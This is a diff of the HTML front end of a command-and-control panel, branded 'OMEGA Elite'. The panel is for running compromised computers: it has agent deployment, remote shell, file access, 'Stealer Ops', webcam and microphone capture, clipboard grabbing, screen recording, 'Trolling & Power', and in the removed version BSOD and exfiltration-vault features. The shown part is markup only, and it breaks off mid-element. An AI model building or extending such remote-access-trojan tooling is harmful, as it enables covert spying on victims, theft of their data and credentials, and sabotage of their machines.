@@ -3,225 +3,1024 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MRL WARE | Command Center</title>
+    <meta name="description" content="OMEGA Elite — Command & Control Dashboard v21.5">
+    <title>OMEGA Elite | Command Center</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=Space+Grotesk:wght@400;500;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="/static/style.css">
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><path fill='%238b5cf6' d='M12 2L2 7l10 5 10-5-10-5z'/><path fill='%238b5cf6' d='M2 17l10 5 10-5'/><path fill='%238b5cf6' d='M2 12l10 5 10-5'/></svg>">
 </head>
-<body oncontextmenu="return false;">
-    <canvas id="neuralCanvas" style="position:fixed;inset:0;pointer-events:none;z-index:0;opacity:0.2"></canvas>
+<body>
 
-    <div class="app-container" id="appContainer">
-        <!-- 1. Sidebar Navigation -->
-        <aside class="sidebar">
-            <a href="/" class="brand">
-                <div class="brand-icon">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
-                </div>
-                <div class="brand-name">MRL WARE</div>
+<!-- ━━ PARTICLES ━━ -->
+<div class="particles" aria-hidden="true">
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+    <div class="particle"></div>
+</div>
+
+<!-- ━━ SIDEBAR ━━ -->
+<aside class="sidebar" id="sidebar">
+    <a class="brand" href="#">
+        <div class="brand-icon">
+            <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/>
+            </svg>
+        </div>
+        <div class="brand-text">
+            <span class="brand-name">OMEGA</span>
+            <span class="brand-sub">Elite Edition</span>
+        </div>
+    </a>
+
+    <ul class="nav-menu">
+        <li class="nav-section-label"><span>Monitor</span></li>
+        <li class="nav-item">
+            <a class="nav-link active" id="nav-overview" onclick="switchView('overview')" href="#overview">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/></svg>
+                <span>Overview</span>
+                <span class="nav-badge pulse" id="nodeCountBadge">0</span>
             </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" id="nav-nodes" onclick="switchView('nodes')" href="#nodes">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="5" r="3"/><circle cx="5" cy="19" r="3"/><circle cx="19" cy="19" r="3"/><line x1="12" y1="8" x2="5.5" y2="16.5"/><line x1="12" y1="8" x2="18.5" y2="16.5"/></svg>
+                <span>Active Nodes</span>
+            </a>
+        </li>
+        <li class="nav-item">
+            <a class="nav-link" id="nav-intel" onclick="switchView('intel')" href="#intel">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+                <span>Activity Stream</span>
+            </a>
+        </li>
 
-            <div class="nav-section">
-                <div class="nav-label">Operations</div>
-                <a class="nav-link active" onclick="showView('overview')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/></svg>
-                    Dashboard
-                </a>
-                <a class="nav-link" onclick="showView('nodes')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"/><path d="M2 12h20"/></svg>
-                    Nodes
-                </a>
-                <a class="nav-link" onclick="showView('vault')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"/></svg>
-                    File Manager
-                </a>
-            </div>
+        <li class="nav-section-label"><span>Operate</span></li>
+        <li class="nav-item">
+            <a class="nav-link" id="nav-deploy" onclick="deployAgent()" href="javascript:void(0)">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                <span>Deploy Agent</span>
+            </a>
+        </li>
+    </ul>
 
-            <div class="nav-section">
-                <div class="nav-label">Intelligence</div>
-                <a class="nav-link" onclick="showView('map')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
-                    Recon
-                </a>
-                <a class="nav-link" onclick="showView('network')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
-                    Network
-                </a>
-            </div>
+    <div class="nav-footer">
+        <div class="conn-indicator" id="connIndicator">
+            <div class="conn-dot offline" id="connDot"></div>
+            <span id="connStatus">Connecting…</span>
+        </div>
+        <div class="version-tag" style="margin-top:0.75rem">
+            <div class="version-dot"></div>
+            <span>v22 Elite</span>
+        </div>
+    </div>
+</aside>
 
-            <div class="nav-section">
-                <div class="nav-label">Fun Tools</div>
-                <a class="nav-link danger" onclick="execTroll('bsod')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
-                    BSOD
-                </a>
-                <a class="nav-link danger" onclick="execTroll('nuke')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l10 6.5v7L12 22 2 15.5v-7L12 2z"/></svg>
-                    Critical Actions
-                </a>
-            </div>
+<!-- ━━ MAIN ━━ -->
+<main class="main-area">
 
-            <div style="margin-top:auto">
-                <a class="nav-link" onclick="showView('settings')">
-                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33 1.82l.06.06a2 2 0 0 1 0 2.83 2 2 0 0 1-2.83 0l-.06-.06a1.65 1.65 0 0 0-1.82-.33 1.65 1.65 0 0 0-1 1.51V21a2 2 0 0 1-2 2 2 2 0 0 1-2-2v-.09A1.65 1.65 0 0 0 9 19.4a1.65 1.65 0 0 0-1.82.33l-.06.06a2 2 0 0 1-2.83 0 2 2 0 0 1 0-2.83l.06-.06a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H3a2 2 0 0 1-2-2 2 2 0 0 1 2-2h.09A1.65 1.65 0 0 0 4.6 9a1.65 1.65 0 0 0-.33-1.82l-.06-.06a2 2 0 0 1 0-2.83 2 2 0 0 1 2.83 0l.06.06a1.65 1.65 0 0 0 1.82.33H9a1.65 1.65 0 0 0 1-1.51V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.09a1.65 1.65 0 0 0 1 1.51 1.65 1.65 0 0 0 1.82-.33l.06-.06a2 2 0 0 1 2.83 0 2 2 0 0 1 0 2.83l-.06.06a1.65 1.65 0 0 0-.33 1.82V9a1.65 1.65 0 0 0 1.51 1H21a2 2 0 0 1 2 2 2 2 0 0 1-2 2h-.09a1.65 1.65 0 0 0-1.51 1z"/></svg>
-                    Settings
-                </a>
-            </div>
-        </aside>
-
-        <!-- 2. Top Status Bar -->
-        <header class="top-bar">
-            <div class="top-stats">
-                <div class="stat-item">
-                    <div class="stat-dot active"></div>
-                    Nodes Online: <span id="statActiveNodes">0</span>
-                </div>
-                <div class="stat-item">
-                    <div class="stat-dot active"></div>
-                    Uplink: <span id="statUplink">Stable</span>
-                </div>
-                <div class="stat-item">
-                    Server Load: <span id="statServerLoad">0%</span>
-                </div>
-                <div class="stat-item">
-                    Encryption: <span style="color:var(--teal)">Active</span>
-                </div>
-                <div class="stat-item">
-                    Ping: <span id="statPing">-- ms</span>
-                </div>
-            </div>
-
-            <div class="top-bar-actions">
-                <div class="profile-circle" id="userProfile">
-                    <span id="userInitials">?</span>
-                </div>
-            </div>
-        </header>
-
-        <!-- 3. Main Area -->
-        <main class="main-area">
-            <div class="workspace-wrapper">
-                                <!-- VIEW 1: Dashboard Workspace -->
-                <div class="workspace-dashboard">
-                    <!-- Dashboard Home (Nodes) -->
-                    <div id="view-overview" class="fade-in">
-                        <div class="node-grid" id="nodeGrid">
-                            <!-- Nodes rendered via script.js -->
-                        </div>
-                    </div>
-
-                    <div id="view-nodes" class="fade-in" style="display:none">
-                        <div class="node-grid" id="nodeGridNodes"></div>
-                    </div>
-
-                    <!-- File Manager View -->
-                    <div id="view-vault" class="fade-in" style="display:none">
-                        <div style="padding:2rem; background:var(--surface); border-radius:16px; border:1px solid var(--border)">
-                            <h3 style="margin-bottom:1rem; font-family: 'Space Grotesk'">Centralized Data Vault</h3>
-                            <div style="color:var(--text-2)">Encrypted exfiltration and neural backups.</div>
-                        </div>
-                    </div>
-
-                    <!-- Recon View -->
-                    <div id="view-map" class="fade-in" style="display:none">
-                        <div id="map" style="height:600px; border-radius:16px; border:1px solid var(--border); background:#000"></div>
-                    </div>
-                </div>
-                </div>
-
-                <!-- VIEW 2: Remote Session Workspace -->
-                <div class="workspace-remote" id="view-remote">
-                    <div class="remote-header">
-                        <button class="btn-back" onclick="closeRemote()">
-                            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="15 18 9 12 15 6"/></svg>
-                            Back
-                        </button>
-                        <div class="remote-node-info">
-                            <span class="remote-node-name" id="remoteNodeLabel">Node ID</span>
-                            <span class="badge badge-teal">● LIVE</span>
-                        </div>
-                        <div class="remote-session-stats">
-                            <div class="session-stat">
-                                <span class="session-stat-label">Performance</span>
-                                <span class="session-stat-value" id="remoteFps">0 FPS</span>
-                            </div>
-                            <div class="session-stat">
-                                <span class="session-stat-label">Latency</span>
-                                <span class="session-stat-value" id="remoteLatency">-- ms</span>
-                            </div>
-                            <div class="session-stat">
-                                <span class="session-stat-label">Resolution</span>
-                                <span class="session-stat-value">1920x1080</span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <div class="remote-body">
-                        <div class="remote-screen-container">
-                            <canvas id="desktopView" style="position:absolute;inset:0;width:100%;height:100%;object-fit:contain;z-index:100"></canvas>
-                            
-                            <!-- Focused Session HUD -->
-                            <div style="position:absolute; top:1rem; right:1rem; z-index:1000; pointer-events:none">
-                                <div style="background:rgba(10,12,18,0.7); backdrop-filter:blur(20px); border:1px solid rgba(255,255,255,0.1); border-radius:12px; padding:0.75rem; display:flex; flex-direction:column; gap:8px; pointer-events:auto">
-                                    <div style="display:flex; align-items:center; gap:10px">
-                                        <span style="font-size:0.6rem; font-weight:800; color:var(--text-3); text-transform:uppercase">Display</span>
-                                        <select id="monSelect" onchange="setMonitor(this.value)" style="background:transparent; border:none; color:var(--accent); font-size:0.75rem; font-weight:700; outline:none; cursor:pointer">
-                                            <option value="0">Screen 1</option>
-                                        </select>
-                                    </div>
-                                    <div style="display:flex; align-items:center; gap:10px">
-                                        <span style="font-size:0.6rem; font-weight:800; color:var(--text-3); text-transform:uppercase">Target FPS</span>
-                                        <select id="fpsSelect" onchange="setStreamFps(this.value)" style="background:transparent; border:none; color:var(--accent); font-size:0.75rem; font-weight:700; outline:none; cursor:pointer">
-                                            <option value="10">10 FPS</option>
-                                            <option value="20">20 FPS</option>
-                                            <option value="30" selected>30 FPS</option>
-                                            <option value="60">60 FPS</option>
-                                        </select>
-                                    </div>
-                                    <div style="display:flex; align-items:center; gap:10px">
-                                        <span style="font-size:0.6rem; font-weight:800; color:var(--text-3); text-transform:uppercase">Camera</span>
-                                        <select id="camSelect" onchange="setCamera(this.value)" style="background:transparent; border:none; color:var(--accent); font-size:0.75rem; font-weight:700; outline:none; cursor:pointer">
-                                            <option value="-1">Cam Off</option>
-                                        </select>
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-
-                        <div class="remote-footer">
-                            <div class="remote-tabs">
-                                <div class="remote-tab active" onclick="switchRemoteTab('screen')">Screen</div>
-                                <div class="remote-tab" onclick="switchRemoteTab('audio')">Audio</div>
-                                <div class="remote-tab" onclick="switchRemoteTab('files')">Files</div>
-                                <div class="remote-tab" onclick="switchRemoteTab('shell')">Shell</div>
-                                <div class="remote-tab" onclick="switchRemoteTab('procs')">Processes</div>
-                                <div class="remote-tab" onclick="switchRemoteTab('tools')">Tools</div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </main>
-
-        <!-- 4. Telemetry Console -->
-        <footer class="console-area">
-            <div class="console-header">
-                <div class="console-title">
-                    <div class="stat-dot active"></div>
-                    Telemetry Console
-                </div>
-                <div style="font-size:0.6rem; color:var(--text-dim)">Uptime: <span id="uptimeCounter">00:00:00</span></div>
-            </div>
-            <div class="console-logs" id="consoleLogs">
-                <!-- Logs rendered via script.js -->
-            </div>
-        </footer>
+    <!-- Top Bar -->
+    <div class="top-bar">
+        <div class="page-title-group">
+            <p class="page-eyebrow" id="viewEyebrow">Global C2 Operations</p>
+            <h1 class="page-title" id="viewTitle">Command Overview</h1>
+        </div>
+        <div class="top-bar-actions">
+            <span class="badge badge-violet" id="wsStatusBadge"><span class="badge-dot"></span>WebSocket Live</span>
+            <button class="btn-primary" onclick="deployAgent()">
+                <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                Deploy
+            </button>
+        </div>
     </div>
 
-    <!-- JS Scripts -->
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script src="/static/script.js"></script>
+    <!-- Stats Row -->
+    <div class="stats-grid">
+        <div class="stat-card">
+            <div class="stat-card-icon violet">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="5" r="3"/><circle cx="5" cy="19" r="3"/><circle cx="19" cy="19" r="3"/><line x1="12" y1="8" x2="5.5" y2="16.5"/><line x1="12" y1="8" x2="18.5" y2="16.5"/></svg>
+            </div>
+            <div class="stat-label">Active Nodes</div>
+            <div class="stat-value" id="countNodes">0</div>
+            <div class="stat-footer up">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3"><polyline points="23 6 13.5 15.5 8.5 10.5 1 18"/></svg>
+                Live Connectivity
+            </div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-card-icon teal">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 20V10"/><path d="M12 20V4"/><path d="M6 20v-6"/></svg>
+            </div>
+            <div class="stat-label">Server Load</div>
+            <div class="stat-value" id="serverLoad">—</div>
+            <div class="stat-footer stable">Optimized Core</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-card-icon blue">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+            </div>
+            <div class="stat-label">Data Uplink</div>
+            <div class="stat-value" id="dataUplink">—</div>
+            <div class="stat-footer stable">Encrypted Channel</div>
+        </div>
+        <div class="stat-card">
+            <div class="stat-card-icon amber">
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 21v-2a4 4 0 00-4-4H5a4 4 0 00-4 4v2"/><circle cx="9" cy="7" r="4"/><path d="M23 21v-2a4 4 0 00-3-3.87"/><path d="M16 3.13a4 4 0 010 7.75"/></svg>
+            </div>
+            <div class="stat-label">Total Registered</div>
+            <div class="stat-value" id="totalClients">0</div>
+            <div class="stat-footer stable">All-time sessions</div>
+        </div>
+    </div>
+
+    <!-- Dashboard Grid -->
+    <div class="dashboard-grid">
+
+        <!-- LEFT: Node Cards -->
+        <div class="dashboard-col">
+            <div class="card" id="nodes">
+                <div class="card-header">
+                    <div class="card-title-group">
+                        <div class="card-title-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+                        </div>
+                        <div>
+                            <div class="card-title">Connected Nodes</div>
+                            <div class="card-subtitle">Click any node to operate it</div>
+                        </div>
+                    </div>
+                    <div class="card-actions">
+                        <span class="badge badge-violet" id="wsStatusBadge2"><span class="badge-dot"></span>Live</span>
+                    </div>
+                </div>
+
+                <!-- Node Cards Grid -->
+                <div class="node-cards-grid" id="nodeCardsGrid">
+                    <div class="node-empty-full" id="nodeEmptyState">
+                        <div class="node-empty-icon">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                        </div>
+                        <p class="node-empty-title">No Active Nodes</p>
+                        <p class="node-empty-sub">Awaiting agent connections… Deploy an agent to get started.</p>
+                        <button class="btn-primary" style="margin-top:1rem" onclick="deployAgent()">
+                            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+                            Deploy Agent
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Detail Table (hidden by default) -->
+                <div id="nodeTableWrap" style="display:none;overflow-x:auto;">
+                    <table class="nodes-table">
+                        <thead><tr>
+                            <th>Node ID</th><th>OS</th><th>IP Address</th><th>User</th><th>CPU</th><th>Status</th><th>Operations</th>
+                        </tr></thead>
+                        <tbody id="nodeBody"></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+
+        <!-- RIGHT: Activity Stream -->
+        <div class="dashboard-col" style="flex:0 0 380px;">
+            <div class="card" id="intel" style="height:100%;display:flex;flex-direction:column;min-height:0;">
+                <div class="card-header">
+                    <div class="card-title-group">
+                        <div class="card-title-icon" style="background:rgba(139,92,246,0.1);color:var(--accent-violet)">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+                        </div>
+                        <div>
+                            <div class="card-title">Activity Stream</div>
+                            <div class="card-subtitle">Live event log</div>
+                        </div>
+                    </div>
+                    <div class="card-actions">
+                        <button class="btn btn-ghost" onclick="clearLogs()">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width:12px;height:12px"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 01-2 2H8a2 2 0 01-2-2L5 6"/></svg>
+                            Clear
+                        </button>
+                    </div>
+                </div>
+                <div class="intel-stream" id="intelStream" style="flex-grow:1;min-height:0;"></div>
+            </div>
+        </div>
+
+    </div><!-- /dashboard-grid -->
+</main>
+
+<!-- ━━ REMOTE OPERATIONS MODAL ━━ -->
+<div id="remoteModal" style="display:none;">
+    <div class="modal-content">
+
+        <!-- Modal top bar -->
+        <div class="modal-topbar">
+            <div class="modal-target-badge" id="modalNodeId">—</div>
+            <div class="modal-title" id="modalTarget">Remote Control</div>
+            <span class="badge badge-violet" id="modalStatus"><span class="badge-dot"></span>Connected</span>
+            <button class="modal-close" onclick="closeModal()" title="Close (Esc)">&#x2715;</button>
+        </div>
+
+        <!-- Modal layout -->
+        <div class="modal-layout">
+
+            <!-- Nav -->
+            <nav class="modal-nav">
+                <button class="modal-nav-btn active" id="mnav-view" onclick="setControlMode('view')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+                    Live View
+                </button>
+                <button class="modal-nav-btn" id="mnav-shell" onclick="setControlMode('shell')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+                    Shell
+                </button>
+                <button class="modal-nav-btn" id="mnav-files" onclick="setControlMode('files')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z"/></svg>
+                    File Explorer
+                </button>
+                <button class="modal-nav-btn" id="mnav-intel" onclick="setControlMode('intel')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+                    System Intel
+                </button>
+                <button class="modal-nav-btn" id="mnav-tasks" onclick="setControlMode('tasks')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg>
+                    Task Manager
+                </button>
+                <button class="modal-nav-btn" id="mnav-stealer" onclick="setControlMode('stealer')" style="color:var(--accent-amber)">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+                    Stealer Ops
+                </button>
+                <button class="modal-nav-btn" id="mnav-troll" onclick="setControlMode('troll')" style="color:var(--accent-red)">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+                    Trolling &amp; Power
+                </button>
+                <button class="modal-nav-btn" id="mnav-camera" onclick="setControlMode('camera')" style="color:var(--accent-teal)">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg>
+                    Camera
+                </button>
+                <button class="modal-nav-btn" id="mnav-audio" onclick="setControlMode('audio')" style="color:var(--accent-blue)">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M19.07 4.93a10 10 0 010 14.14M15.54 8.46a5 5 0 010 7.07"/></svg>
+                    Audio
+                </button>
+                <button class="modal-nav-btn" id="mnav-clipboard" onclick="setControlMode('clipboard')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 4h2a2 2 0 012 2v14a2 2 0 01-2 2H6a2 2 0 01-2-2V6a2 2 0 012-2h2"/><rect x="8" y="2" width="8" height="4" rx="1" ry="1"/></svg>
+                    Clipboard
+                </button>
+                <button class="modal-nav-btn" id="mnav-recon" onclick="setControlMode('recon')" style="color:var(--accent-violet)">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/></svg>
+                    Recon
+                </button>
+                <button class="modal-nav-btn" id="mnav-geo" onclick="setControlMode('geo')">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/></svg>
+                    GeoIP Map
+                </button>
+                <div style="flex-grow:1"></div>
+                <!-- Quick Snap -->
+                <button class="modal-nav-btn" onclick="sendCmd({t:'screenshot',type:'screenshot'})" title="Take Screenshot" style="opacity:0.7;font-size:0.72rem;">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><circle cx="12" cy="12" r="4"/></svg>
+                    Snap
+                </button>
+            </nav>
+
+            <!-- View area -->
+            <div class="modal-view-area">
+
+                <!-- ── Live View ── -->
+                <div class="modal-panel panel-active" id="panel-view">
+                    <div class="stream-wrapper" id="streamWrapper">
+
+                        <!-- Stream controls bar -->
+                        <div class="stream-controls" id="streamControls">
+                            <!-- Monitor switcher -->
+                            <div style="display:flex;gap:4px;align-items:center;">
+                                <select id="streamMonitorSelect" class="streamMonitorSelect" title="Select Monitor" onchange="changeMonitor()">
+                                    <option value="0">Monitor 1</option>
+                                </select>
+                                <button class="btn btn-ctrl" onclick="toggleGridView()" id="btn-grid-toggle" title="All Screens Grid">
+                                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 3h7v7H3zM14 3h7v7h-7zM14 14h7v7h-7zM3 14h7v7H3z"/></svg>
+                                </button>
+                            </div>
+                            <div class="ctrl-divider"></div>
+
+                            <button class="btn btn-ctrl" id="btn-toggle-camera" onclick="setCamOn(0)" title="Camera PiP ON">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2" ry="2"/></svg>
+                            </button>
+                            <button class="btn btn-ctrl" id="btn-desktop-audio" onclick="toggleDesktopAudio()" title="Desktop Audio">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M19.07 4.93a10 10 0 010 14.14M15.54 8.46a5 5 0 010 7.07"/></svg>
+                            </button>
+                            <button class="btn btn-ctrl" id="btn-mic-audio" onclick="toggleMicAudio()" title="Mic Audio">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 1a3 3 0 00-3 3v8a3 3 0 006 0V4a3 3 0 00-3-3z"/><path d="M19 10v2a7 7 0 01-14 0v-2"/></svg>
+                            </button>
+                            <button class="btn btn-ctrl" id="btn-rec" onclick="toggleScreenRecorder()" title="Record Screen">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3" fill="currentColor"/></svg>
+                            </button>
+                            <div class="ctrl-divider"></div>
+
+                            <!-- MNK Overlay Toggle (default OFF) -->
+                            <button class="btn btn-ctrl" id="btn-mnk-overlay" onclick="toggleMNKOverlay()" title="Input Overlay: OFF">
+                                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 3h14a2 2 0 012 2v14a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2z"/><circle cx="9" cy="9" r="1.5" fill="currentColor"/><circle cx="15" cy="9" r="1.5" fill="currentColor"/><path d="M12 12v5"/></svg>
+                            </button>
+                            <div class="ctrl-divider"></div>
+
+                            <!-- Stream start/stop -->
+                            <button class="btn btn-ghost" id="streamToggleBtn" onclick="toggleStream()">
